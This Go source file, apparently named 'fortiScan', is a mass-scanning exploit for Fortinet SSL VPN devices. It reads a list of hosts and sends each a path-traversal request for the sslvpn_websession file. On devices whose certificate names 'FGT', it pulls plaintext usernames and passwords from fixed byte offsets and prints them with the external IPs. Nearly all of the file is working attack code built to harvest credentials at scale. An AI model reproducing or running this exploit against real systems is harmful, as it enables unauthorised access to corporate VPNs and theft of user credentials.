package scan

import (
	"bufio"
	"bytes"
	"encoding/json"
	"io"

	//"errors"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/cockroachdb/errors"
	"github.com/common-nighthawk/go-figure"
)

const userAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/anasbousselham/)"
const signature = "var fgt_lang ="
const payloads = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
const (
	InfoColor    = "\033[1;34m%s\033[0m"
	NoticeColor  = "\033[1;36m%s\033[0m"
	WarningColor = "\033[1;33m%s\033[0m"
	ErrorColor   = "\033[1;31m%s\033[0m"
	DebugColor   = "\033[0;36m%s\033[0m"
)

var codername = "Anas Bousselham"
var ver = "0.7"
var eml = "anasoft@gmail.com"

type VulJson struct {
	URL      string `json:"url"`
	User     string `json:"user"`
	Password string `json:"password"`
	Serial   string `json:"SN"`
	EXTIP    string `json:"extip"`
}

type SSLCerts struct {
	SHA1                string
	SubjectKeyId        string
	Version             int
	SignatureAlgorithm  string
	PublicKeyAlgorithm  string
	Subject             string
	DNSNames            []string
	NotBefore, NotAfter string
	ExpiresIn           string
	Issuer              string
	AuthorityKeyId      string
}

func logoprint() {
	myFigure := figure.NewFigure("fortiScan", "", true)
	myFigure.Print()
	fmt.Println(codername)
	fmt.Println(eml)
	fmt.Println("Ver: ", ver)

}

func NewClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:    20,
		IdleConnTimeout: time.Second,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	return &http.Client{
		Transport: tr,
		Timeout:   time.Second * 10,
	}
}
func lineCounter(r io.Reader) (int, int, error) {
	buf := make([]byte, 32*1024)
	count := 0

	lineSep := []byte{'\n'}
	byteCount := 0
	for {
		c, err := r.Read(buf)
		byteCount += c

		count += bytes.Count(buf[:c], lineSep)

		if err == io.EOF {
			return count, byteCount, nil
		} else if err != nil {
			return count, byteCount, err
		}
	}
}

func FromStdin() {
	logoprint()

	if len(os.Args) != 2 {
		fmt.Println("Usage: fortiscan url.file")
		return
	}
	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintf(os.Stderr, "Encountered error while counting: %v", err)
		os.Exit(1)
	}
	defer file.Close()

	var wg sync.WaitGroup

	sc := bufio.NewScanner(file)

	count := 0

	for sc.Scan() {
		URL := sc.Text()
		count++

		wg.Add(1)
		go func() {
			defer wg.Done()
			DotDotReq(URL)
		}()

	}

	fmt.Printf("[*] Loading %s IP list\n", fmt.Sprint(count))

	fmt.Println("[*] Scanning")

	if err := sc.Err(); err != nil {
		log.Println("error: ", err)
	}
	wg.Wait()
	println("[Bye>>]")
}

func IsAsciiPrintable(s string) bool {
	for _, r := range s {
		if r > unicode.MaxASCII || !unicode.IsPrint(r) {
			return false
		}
	}
	return true
}

func GetStringInBetween(str string, start string, end string) (result string) {
	s := strings.Index(str, start)
	if s == -1 {
		return
	}
	s += len(start)
	e := strings.Index(str[s:], end)
	if e == -1 {
		return
	}
	return str[s:e]
}

func GetCertificatesPEM(address string) (string, error) {
	cfg := tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", address, &cfg)
	if err != nil {
		log.Fatalln("TLS connection failed: " + err.Error())
	}

	certChain := conn.ConnectionState().PeerCertificates
	return certChain[0].Subject.CommonName, nil
}

func IsIP(data string) bool {
	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
	//	submatchall := re.FindAllString(data, -1)

	return re.MatchString(data)
}

func SplitHostPort(v string, defaultPort string) (addr string, port string, err error) {
	addr, port, err = net.SplitHostPort(v)
	if err != nil {
		var aerr *net.AddrError
		if errors.As(err, &aerr) {
			if strings.HasPrefix(aerr.Err, "too many colons") {

				maybeAddr := "[" + v + "]:" + defaultPort
				addr, port, err = net.SplitHostPort(maybeAddr)
				if err == nil {
					err = errors.WithHintf(
						errors.Newf("invalid address format: %q", v),
						"enclose IPv6 addresses within [...], e.g. \"[%s]\"", v)
				}
			} else if strings.HasPrefix(aerr.Err, "missing port") {

				addr, port, err = net.SplitHostPort(v + ":" + defaultPort)
			}
		}
	}
	return addr, port, err
}

func notSanitizer(s string) string {
	var b strings.Builder
	for _, c := range s {
		if c == '\uFFFD' {
			continue
		}
		b.WriteRune(c)
	}
	return b.String()
}

func insertNth(s string, n int) string {
	var buffer bytes.Buffer
	var n_1 = n - 1
	var l_1 = len(s) - 1
	for i, rune := range s {
		buffer.WriteRune(rune)
		if i%n == n_1 && i != l_1 {
			buffer.WriteRune('-')
		}
	}
	return buffer.String()
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func writeFile(json string, filename string) {
	file, err := os.Create(filename)
	defer file.Close()

	if err != nil {
		log.Fatal(err)
	} /*
		_, err2 := file.WriteString(json)
		log.Fatal(err2) */
}

func removeInvalidChar(value string) string {
	/* REMOVE INVALID UTF8 CHAR */
	if !utf8.ValidString(value) {
		v := make([]rune, 0, len(value))
		for i, r := range value {
			if r == utf8.RuneError {
				_, size := utf8.DecodeRuneInString(value[i:])
				if size == 1 {
					continue
				}
			}
			v = append(v, r)

		}
		value = string(v)
	}

	/* REMOVE NON PRINTABLE CHAR */
	clean := strings.Map(func(r rune) rune {
		if unicode.IsPrint(r) {
			return r
		}

		sc := fmt.Sprintf("%q", r)
		scn := len(sc)

		// find hex character code
		// https://golang.org/pkg/regexp/syntax/
		if scn >= 6 && sc[:1] == "'" && sc[scn-1:] == "'" && sc[1:3] == "\\x" {
			return -1
		}

		return r
	}, value)

	return clean
}

func checkssl(domainName string, skipVerify bool) ([]SSLCerts, error) {
	//Connect network
	ipConn, err := net.DialTimeout("tcp", domainName, 10000*time.Millisecond)
	if err != nil {
		return nil, err
	}
	defer ipConn.Close()
	// Configure tls to look at domainName
	config := tls.Config{ServerName: domainName,
		InsecureSkipVerify: skipVerify}
	// Connect to tls
	conn := tls.Client(ipConn, &config)
	defer conn.Close()
	// Handshake with TLS to get certs
	hsErr := conn.Handshake()
	if hsErr != nil {
		return nil, hsErr
	}
	certs := conn.ConnectionState().PeerCertificates

	if certs == nil || len(certs) < 1 {
		return nil, errors.New("Could not get server's certificate from the TLS connection.")
	}

	sslcerts := make([]SSLCerts, len(certs))
	for i, cert := range certs {
		s := SSLCerts{SubjectKeyId: fmt.Sprintf("%X", cert.SubjectKeyId),

			Subject: cert.Subject.CommonName,
		}
		sslcerts[i] = s

	}

	return sslcerts, nil
}

func prettyPrint(i interface{}) string {
	s, _ := json.MarshalIndent(i, "", "\t")
	return string(s)
}

func DotDotReq(url string) {

	//var cer string
	var err error
	var certs []SSLCerts

	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
	client := NewClient()
	scanner := bufio.NewScanner(strings.NewReader(payloads))

	for scanner.Scan() {
		host, port, err1 := SplitHostPort(url, "443")
		if err1 != nil {
			//return nil, err
		}

		if host == "" {
			//return nil, nil
		}
		//	fmt.Println("[*] Ready to scan")
		/* cfg := tls.Config{InsecureSkipVerify: true}
		conn, err := tls.Dial("tcp", url, &cfg)

		if err != nil {
			log.Fatalln("TLS connection failed: " + err.Error())
		}
		certChain := conn.ConnectionState().PeerCertificates */
		certs, err = checkssl(host+":"+port, false)
		if err != nil {
			//cer = fmt.Sprintf("%s", err)
		}
		if certs == nil && err != nil {
			certs, err = checkssl(host+":"+port, true)
			if err != nil {
				//	cer = fmt.Sprintf("%s", err)
			}
		}

		payload := scanner.Text()
		//fmt.Println("[*] Grab CN")
		urlReq := url + payload
		req, err := http.NewRequest("GET", "https://"+urlReq, nil)
		req.Header.Set("User-Agent", userAgent)
		if err != nil {
			log.Fatalln("[!] Error ", urlReq)
		}

		resp, err := client.Do(req)
		if err != nil {
			return
			//	log.Fatalln("[!] Error ", err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Println("[!] Body data Error ", urlReq)
		}

		bodyStr := string(body)
		//bodyStr1 = strings.TrimFunc(bodyStr, func(r rune) bool {
		//	return !unicode.IsPrint(r)
		//})
		//println("cert", certs[0].Subject)
		var CN_serie string
		for _, n := range certs {
			CN_serie = n.Subject

			//println(CN_serie)
			if strings.Contains(CN_serie /* certChain[0].Subject.CommonName */, "FGT") {
				//fmt.Println("[*] Grab CN")
				d1 := []byte(body)
				err := ioutil.WriteFile("data__", d1, 0777)
				check(err)
				file, err := os.Open("data__")
				check(err)
				defer file.Close()
				file.Seek(110, 0)
				check(err)
				_user := make([]byte, 15)
				file.Read(_user)
				clean_user := removeInvalidChar(string(_user[:]))

				////pwd
				file.Seek(432, 0)
				check(err)
				_pwd := make([]byte, 100)
				file.Read(_pwd)
				clean_pwd := removeInvalidChar(string(_pwd[:]))

				_outUtf8 := notSanitizer(bodyStr)
				submatchall := re.FindAllString(_outUtf8, -1)

				for _, element := range submatchall {

					//t := strings.SplitAfter(_outUtf8, element)

					//t := GetStringInBetween(_outUtf8, element, "")
					//	fmt.Println(_outUtf8)
					fmt.Printf("[VULNERABLE]:%s User:%s Pwd:%s CN:%s External IP:%s\n", url, clean_user, clean_pwd, CN_serie, element)
					/* myVulJson := VulJson{
						URL:      url,
						User:     clean_user,
						Password: clean_pwd,
						Serial:   CN_serie,
						EXTIP:    element,
					} */
					//json_f, err_ := json.MarshalIndent(myVulJson, "", "    ")

					if err != nil {
						log.Fatal("Failed to generate json", err)
					}
					//fmt.Printf("%s\n", string(json_f))

				}
				//	err = ioutil.WriteFile("output.json", json_f, 0644)
			} /* else {
				fmt.Printf("[!] %s not vulnerable %s CN :\n", url)

			} */

		}

		/* if strings.Contains(bodyStr, signature) {
			//	_out := re.MatchString(bodyStr)
			//print(removeInvalidChar(_outUtf8))
			//	fmt.Println(removeInvalidChar(bodyStr))
			_outUtf8 := notSanitizer(bodyStr)
			//_A := strings.ToValidUTF8(bodyStr, "❗")
			//print(removeInvalidChar(_outUtf8))
			submatchall := re.FindAllString(_outUtf8, -1)

			for _, element := range submatchall {

				//t := strings.SplitAfter(_outUtf8, element)

				//t := GetStringInBetween(_outUtf8, element, "")
				//	fmt.Println(_outUtf8)
				fmt.Printf("[VULNERABLE]:%s DomainCN:%s External IP:%s\n", url, certChain[0].Subject.CommonName, element)

			}
		} */

		defer resp.Body.Close()
		//

	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "shouldn't see an error scanning a string")
	}

}
